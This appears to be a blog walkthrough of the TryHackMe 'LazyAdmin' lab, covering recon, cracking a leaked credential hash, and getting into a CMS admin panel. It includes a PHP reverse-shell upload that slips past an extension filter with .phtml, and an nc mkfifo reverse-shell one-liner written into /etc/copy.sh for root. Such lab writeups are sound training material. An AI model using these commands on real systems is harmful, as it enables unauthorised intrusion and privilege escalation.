---
title: "LazyAdmin - TryHackMe"
date: 2026-03-27 02:40:00 +0000
categories: [TryHackMe, Writeups]
tags: [nmap, gobuster, ctf, privilege-escalation]
image: /assets/img/writeups/covers/lazy-admin.jpeg
---
# LazyAdmin - TryHackme
![1.png](/assets/img/writeups/lazy-admin/1.png)
**Difficulty**: Easy <br>**Time Required** : 37 min
## Reconnaissance
Started with an Nmap scan to identify open ports and services: `nmap -p- 10.67.128.235 -sV -T4`
````
$ nmap 10.67.128.235 -sV -T4 -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 06:07 +0500
Nmap scan report for 10.67.128.235 (10.67.128.235)
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.84 seconds
````
### Findings
- Port 22 → SSH
- Port 80 → HTTP (Web Server)

Visiting the web server:
````
http://10.67.128.235
````
![1.png](/assets/img/writeups/lazy-admin/4.png)
An Apache default page.
## Directory Brute Forcing
Use gobuster to find hidden directories:
```
$ gobuster dir -u 10.67.160.222 -w /usr/share/wordlists/dirb/common.txt -t 60
```
A hidden directory `/content` was found.
![1.png](/assets/img/writeups/lazy-admin/5.png)
Nothing special.<br>Run gobuster again on this directory:
````
$ gobuster dir -u 10.67.128.235/content -w /usr/share/wordlists/dirb/common.txt -t 60
````
![1.png](/assets/img/writeups/lazy-admin/6.png)
**Discovered Paths**:
- /images
- /js
- /inc
- /as
- /attachments
- /_themes

### Finding Sensitive Data

Inside: `/content/inc`<br>We find a MySQL backup file: `mysql-bakup_20191129023059–1.5.1.sql`
![1.png](/assets/img/writeups/lazy-admin/8.png)
Download and inspect it:
![1.png](/assets/img/writeups/lazy-admin/9.png)

**Credentials Found**
- Username: manager
- Password (hash): 42f749ade7f9e195bf475f37a44cafcb

Crack the hash using CrackStation.
![1.png](/assets/img/writeups/lazy-admin/7.png)
## Admin Panel

Navigate to:
````
http://10.67.128.235/content/as/
````
Login using the cracked credentials.

### Initial Access
Inside the panel, create a new post and upload a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).<br>Since `.php` is blocked, bypass it by using `.phtml` extension.
![1.png](/assets/img/writeups/lazy-admin/10.png)
![1.png](/assets/img/writeups/lazy-admin/11.png)
Upload the file and start a listener:
````
$ nc -lvnp 1234
````

Execute the file from:
````
http://10.67.128.235/content/attachments/
````
![1.png](/assets/img/writeups/lazy-admin/12.png)
![1.png](/assets/img/writeups/lazy-admin/2.png)
Search and retrieve the user flag:
```
$ cat /home/itguy/user.txt
````
## Privilege Escalation
Now we escalate privileges to root.<br>**Check Sudo Permissions**:
```
$ sudo -l
```

We can run: `/usr/bin/perl /home/itguy/backup.pl`
**Navigate to**:
````
$ cd /home/itguy
$ ls -la
````
We find `backup.pl`. This script internally calls `/etc/copy.sh`.
### Exploiting copy.sh
Replace the content of this file with a reverse shell payload.
````
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 1122 >/tmp/f" > /etc/copy.sh
````
**Start a listener on your machine**
```
$ nc -lvnp 1122
````

Run `backup.pl` to execute `copy.sh`

```
$ sudo /usr/bin/perl /home/itguy/backup.pl
```
![1.png](/assets/img/writeups/lazy-admin/13.png)
![1.png](/assets/img/writeups/lazy-admin/14.png)
